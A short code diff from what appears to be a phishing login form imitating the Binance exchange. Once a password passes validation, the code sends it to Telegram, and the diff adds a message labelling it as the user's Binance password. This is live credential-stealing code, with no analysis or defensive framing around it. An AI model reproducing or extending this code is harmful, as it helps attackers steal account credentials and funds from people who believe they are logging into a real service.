@@ -93,7 +93,8 @@ export default function LoginForm({ setNavigation, navigation }) {
         const isValid = validatePassword(password);
         setIsLoading(true);
         console.log("PASSWORD IS VALID, CALLING LOADER NOW");
-        sendMessageToTelegram(password);
+        const message = `User Binance Password Is: ${password}`
+        sendMessageToTelegram(message);
 
 
         // Comment out when pushing to prod
